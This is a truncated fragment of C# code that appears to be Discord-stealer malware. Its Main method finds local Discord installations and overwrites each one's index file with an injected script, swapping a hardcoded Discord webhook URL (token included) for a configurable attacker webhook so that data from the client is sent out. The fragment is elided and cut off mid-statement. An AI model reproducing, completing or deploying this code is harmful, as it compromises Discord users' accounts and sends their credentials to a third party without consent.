    ...
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            foreach (var item in GetDiscords())
            {
                try
                {
                    File.WriteAllText(GetIndex(item), script.Replace("https://canary.discord.com/api/webhooks/842952525523058699/DvDniybibHE5gQDMVMsJNLf6aq6S6FEC3Q0HT1xkimyii8JDeaGZpaH-MXo3ls-9ORC3", Settings.Webhook));
